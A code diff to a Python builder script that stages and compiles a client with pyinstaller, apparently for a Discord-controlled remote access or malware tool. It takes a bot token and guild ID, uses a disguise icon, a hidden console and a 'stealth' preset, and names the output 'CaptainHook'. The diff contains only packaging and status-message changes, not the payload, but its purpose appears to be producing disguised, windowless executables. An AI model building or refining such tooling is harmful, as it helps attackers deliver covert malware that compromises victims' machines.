@@ -185,16 +185,15 @@ def build(token, guild_id, preset_name, disguise_name):
 
         # Step 4: Final Compilation Setup
         progress.add_task(description="Setting up distribution folder...", total=None)
-        if not os.path.exists("dist"):
-            os.makedirs("dist")
+        os.makedirs("dist", exist_ok=True)
         
         # OS-Specific instructions
         if os.name == 'nt':
-            cmd = f"pyinstaller --onefile --noconsole --icon={disguise['icon']} build_staging/src/client/main.py"
+            cmd = f"pyinstaller --onefile --noconsole --icon={disguise['icon']} --name CaptainHook build_staging/src/client/main.py"
             ext = ".exe"
         else:
-            cmd = f"pyinstaller --onefile --noconsole build_staging/src/client/main.py"
-            ext = ".bin"
+            cmd = f"pyinstaller --onefile --noconsole --name CaptainHook build_staging/src/client/main.py"
+            ext = ""
         
     console.print(Panel(f"""
 [bold green]STAGING SUCCESSFUL![/bold green]
@@ -205,8 +204,9 @@ def build(token, guild_id, preset_name, disguise_name):
 [cyan]Stealth:[/cyan] [white]{'ENABLED' if preset['stealth'] else 'DISABLED'}[/white]
 
 [bold yellow]Final Step (Manual Compilation):[/bold yellow]
-You are on [bold]{'Windows' if os.name == 'nt' else 'Linux/macOS'}[/bold]. 
-To create the standalone {ext} file, run:
+You are on [bold]{'Windows' if os.name == 'nt' else 'Linux/macOS'}[/bold].
+Output file: [bold]dist/CaptainHook{ext}[/bold]
+To compile, run:
 [dim]{cmd}[/dim]
 
 [bold cyan]💡 Cross-Platform Tip:[/bold cyan]
